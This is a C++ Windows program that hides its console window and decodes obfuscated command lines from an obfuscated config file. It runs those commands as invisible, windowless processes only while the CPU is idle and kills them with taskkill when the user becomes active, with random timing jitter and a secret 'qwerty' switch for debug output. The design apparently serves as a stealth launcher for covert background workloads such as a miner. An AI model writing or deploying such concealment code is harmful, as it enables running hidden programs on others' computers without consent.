#include <iostream>
#include <string>
#include <stdexcept>
#include <fstream>
#include <sstream>
#include <vector>
#include <stack>
#include <random>

//#include <memory>
//#include <future>
//#include <mutex>
//#include <chrono>
//#include <condition_variable>
//#include <deque>
#include <thread>

#include <windows.h>

#include "xstr.hpp"
#include "cpusage.hpp"

using namespace std;

FILE* pipe = NULL;

int IDLE = 0;
int BUSY = 0;

int PooID = 0;

bool show_cpu = true;
bool cons = false;

vector<hide::line> Run;
std::stack<DWORD> JOBs;

int TIMEOUT = 50;
int DEADLINE = 5;
int THRMAX = 1;

static string TMPath; 

cpusage CPU;

void job (void)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ::ZeroMemory(&si, sizeof si);
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

//cout << "Run: " << Run[PooID].c_str() << endl;
    ::CreateProcess(NULL, (LPSTR) Run[PooID].c_str(), NULL, NULL, FALSE, 
              CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    JOBs.push(pi.dwProcessId);

    ::CloseHandle(pi.hThread);
    ::CloseHandle(pi.hProcess);
}
/*
 * ==================
 */
void CALLBACK CPUsage ( HWND wnd , UINT uMsg , UINT Id , DWORD dwTime) { 

int Idle = CPU.Idle();

//if (show_cpu) cout << Idle << " JOBs: " << JOBs.size() << "MAX: " << THRMAX << endl;

if ( Idle > 40 && JOBs.size() < THRMAX ) {
   ++IDLE;  

//cout << "IDLE: " << IDLE << endl;

}
else IDLE = 0;

if ( Idle < 10 && JOBs.size() ) {
   ++BUSY;  

//cout << "BUSY: " << BUSY << endl;

}
else BUSY = 0;

if (IDLE == TIMEOUT) {
    IDLE = 0;
    job();

} else 
    if (BUSY == DEADLINE) {
        BUSY = 0;
        stringstream pid;
        pid << "taskkill /F /PID " << JOBs.top() << flush;
        JOBs.pop();

//cout << pid.str() << endl;
        ::popen(pid.str().c_str(), "r");
   }

}

/*
 * ==================
 */
void Timer (void) {
::SetTimer (NULL, 0, 5000, (TIMERPROC) &CPUsage);

static MSG msg;
while( ::GetMessage(&msg, NULL, 0, 0)) {
    ::TranslateMessage(&msg);
    ::DispatchMessage(&msg);
}
}

/*
 * ======= M A I N =======================
 */
int main (int argc, char** argv
) {
try {

if (argc > 1) {
    string arg(argv[1]);
    if (arg == "qwerty") cons = true;
}

if (!cons) ::ShowWindow( ::GetConsoleWindow(), SW_HIDE );

static hide::line name("");
    name.decode();
    if (cons) cout << name << endl;
    ifstream  inifile( name.c_str(), ios::in); 
    if ( !inifile.is_open())
        throw runtime_error(name + ": file not open");

static hide::line arg, Args;

while ( getline(inifile, arg)) {
    if ( *(arg.begin()) == '#') {
        Args.append(" 2>&1");
        Run.push_back(Args);
        Args.clear();
        continue;
    }
    arg.decode();
    if (cons)
            cout << arg << endl;
    Args.append(arg);
}

inifile.close();

if (cons)
    throw runtime_error("^^^ eof");
if ( !Run.size())
    throw runtime_error("never mind");
//------------------------
{
char buff[256];
::GetEnvironmentVariable( "NUMBER_OF_PROCESSORS", buff, sizeof buff);
stringstream kerns(buff);
kerns >> THRMAX;
THRMAX--;

::GetEnvironmentVariable( "TEMP", buff, sizeof buff);
kerns << buff << '\\' << flush;
TMPath = kerns.str().c_str();
//------------------------
random_device   r;
default_random_engine re(r());
uniform_int_distribution<int> uniform_dist(0,50);

TIMEOUT += uniform_dist(re); 
}
//------------------------
thread th1(Timer);
th1.detach();
//------------------------
static string console;
while ( getline (cin, console)) {
 //   cout << console << " CPU% " << CPU.GetCPULoad() * 100 << endl;
}

return 0;

} catch (const exception& e) {
    cerr << e.what() << endl;
    return 1;
}}